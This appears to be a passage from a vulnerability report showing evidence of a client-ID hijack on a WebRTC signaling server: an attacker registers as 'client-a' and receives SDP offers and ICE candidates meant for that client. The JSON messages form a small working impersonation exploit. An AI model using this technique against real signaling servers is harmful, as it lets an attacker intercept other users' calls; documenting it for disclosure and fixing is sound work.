1. **Attacker’s registration request**:

   ```json
   {"type": "register", "clientId": "client-a", "meta": {"displayName": "attacker"}}
   ```

2. Server’s registration response:

    ```
    {"type": "registered", "clientId": "client-a"}

    ```

3. At least one forwarded message intended for client-a but received by attacker:

    ```
    {
     "to": "client-a",
     "from": "client-b",
     "type": "offer",
     "sdp": "v=0\r\no=- 4192634..."
    }
    ```

4. ICE candidates / other messages:

    ```
    {
     "to": "client-a",
     "from": "client-b",
     "type": "ice",
     "candidate": {
        "candidate": "candidate:2468953775 1 udp ...",
        "sdpMid": "0",
        "sdpMLineIndex": 0
     }
    }
    ```